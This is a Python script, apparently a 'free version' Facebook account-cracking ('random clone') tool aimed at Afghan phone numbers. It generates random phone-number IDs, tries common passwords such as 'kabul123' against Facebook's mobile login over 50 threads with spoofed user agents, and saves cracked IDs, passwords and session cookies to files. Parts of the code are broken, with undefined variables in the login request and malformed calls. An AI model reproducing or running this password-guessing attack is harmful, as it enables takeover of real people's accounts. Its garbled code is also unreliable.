mCREATE/by/𝐅𝐚𝐢𝐬𝐚𝐥
#free version 

import os
import sys
import time
import requests
import uuid

class jalan:
    
    def __init__(self, z):
        pass


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;97m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;97m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#--(Dark@Colours)---#
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
s="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
#--(rare-colors)--#
holaa="38;5"
ro=(f"\033[{holaa};208")
rb=(f"\033[{holaa};32")
rc=(f"\033[{holaa};122m")
rg= (f"\033[{holaa};112m")
rp=(f"\033[{holaa};147m")
my_color = [f"lg,lr,lc,ll,y,g,s,l"]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
warna = random.choice(my_color)
###----------[ CONVERT LINE ]----------###
led = f'{B} -{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}-{M}-{B}-{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{K}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}{M}-{B}'
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}âˆš{K}] {P}'
dot=f' {K}[{GREEN}â€¢{K}] {P}'
rdd=f' {K}[{RED}â€¢{K}] {P}'
rgen=f' {K}[{RED}âˆš{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
fst=f'{dot}[{H}sathi{M}={H}abir{M}={H}tisha{M}={H}mahin{M}={H}samim{P}]'
lst=f'{dot}[{H}akter{M}={H}khan{M}={H}hasan{M}={H}ahmed{M}={H}ali{P}]'
limitt=f'{dot}[{H}5000{M}={H}10000{M}={H}15000{M}={H}20000{M}={H}50000{P}]'
c7=f'{dot}[{H}0177{M}={H}0196{M}={H}0161{M}={H}0176{M}={H}0196{M}={H}0179{P}]'
c6=f'{dot}[{H}01778{M}={H}01991{M}={H}01661{M}={H}01776{M}={H}01996{M}={H}01779{P}]'
c8=f'{dot}[{H}017{M}={H}019{M}={H}016{M}={H}013{M}={H}018{M}={H}014{M}={H}015{P}]'
logo = (f""" 
{A}

  ______    _           _ 
 |  ____|  (_)         | |
 | |__ __ _ _ ___  __ _| |
 |  __/ _` | / __|/ _` | |
 | | | (_| | \__ \ (_| | |
 |_|  \__,_|_|___/\__,_|_|
                          
                          

{A}{57*'='}
[{c}^{A}] AUTHOR   [{lg}∆—{lr}{lg}∆{A}]  TEAM - TECH
[{c}^{A}] FACEBOOK [{lg}∆—{lr}{lg}∆{A}]  𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲
[{c}^{A}] GITHUB   [{lg}∆—{lr}{lg}∆{A}] 𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲
[{c}^{A}] STATUS   [{lg}∆—{lr}{lg}∆{A}]  FREE
[{c}^{A}] VERSION  [{lg}∆—{lr}{lg}∆{A}] 1.1{A}
{57*'='}""")
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
def lines():
    print(57*'=')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
   # print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\ninternet not found')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

def menu():
    clear()
    print(f'[&] 𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲 𝑻𝑶𝑶𝑳𝑺[KUNDUZI] ')
    lines()
    print('[1] RANDOM CLONE  —AFG— ')
    print('[2] FOLLOW MY FACEBOOK ')
    print('[3] Join my WhatsApp  TEAM TEAH ')
    lines()
    sking = input('[-] CHOOSE OPTION-> ')
    if sking =='1':afg()
    if sking =='2':os.system('xdg-openhttps://www.facebook.com/profile.php?id=100074211366139')
    if sking =='3':os.system('xdg-open https://chat.whatsapp.com/Ia2YLnP0zqX4cYvoBNJ4UF')
    else:
        print(' incorrect ')

# APK CHECK
def afg():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('[°_°] USE YOUR COUNTRY CODE ')
    lines()
    print('[°_°] EXAMPLE : 9377/9378/9379/9370 ')
    lines()
    code = input('[+] PUT CODE : ')
    print("")
    lines()
    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[+] PUT CODE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f'[•∆] TOTAL IDS : {tl} ')
        print(f'[•∆] CHOICE CODE : {lg}{code}{A} ')
        print('[•∆] NETWORK : 2G,3G,4G ^ WORKING THE WIFI ')
        print('[•∆] IF NO RESULTS USE FLIGHT MODE ')
        lines()
        for love in user:
            uid = code+love
            pwx = [love,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','50006000','100200','۵۰۰۵۰۰','۱۰۰۲۰۰','afghan123456','۷۰۰۸۰۰','kabul123456','khan123','10002000','600700','Afghanistan','۶۰۰۷۰۰','Afghan123','Love123','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','afghan','khan12','kabul1234']
            manshera.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            animasi = random.choice(["\x1b[1;91m","\x1b[1;92m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;93m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;94m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;95m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;96m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;97m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;91m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;92m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;93m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;94m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;95m𝐅𝐚𝐢𝐬𝐚𝐥","\x1b[1;96m𝐅𝐚𝐢𝐬𝐚𝐥"])
            sys.stdout.write(f'\r{P}[{animasi}{N}-{H}CRACK{P}] [{lg}%s{A}/{lr}%s{A}] [{lg}OK-%s{A}] [{ORANGE}CP-%s{A}] '%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            sc = random.choice(['macOS','Windows','Linex','Android'])
            free_fb = session.get('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.alpha.facebook.com',
            "method": 'POST',
            "scheme": 'https',
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryeCgXuarckjestorn',
              'origin': 'https://m.alpha.facebook.com',
              'referer': 'https://m.alpha.facebook.com/',
              'sec-ch-prefers-color-scheme': 'light',
              'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Opera";v="97"',
              'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5648.210", "Opera";v="97.0.3258.171"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '""',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
            "user-agent": pro}
            lo = session.post('https://m.alpha.facebook.com/a/bz', params=params, cookies=cookies, headers=headers, data=data).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r{GREEN}[𝐅𝐚𝐢𝐬𝐚𝐥-OK] {cid} | {ps} \n COOKIE• : {coki} \n  ')
                cek_apk(session,coki)
                open('/sdcard/𝐅𝐚𝐢𝐬𝐚𝐥-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print(f'\r{ORANGE}[𝐅𝐚𝐢𝐬𝐚𝐥-CP] {cid} | {ps} ')
                open('/sdcard/𝐅𝐚𝐢𝐬𝐚𝐥-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
menu()
 
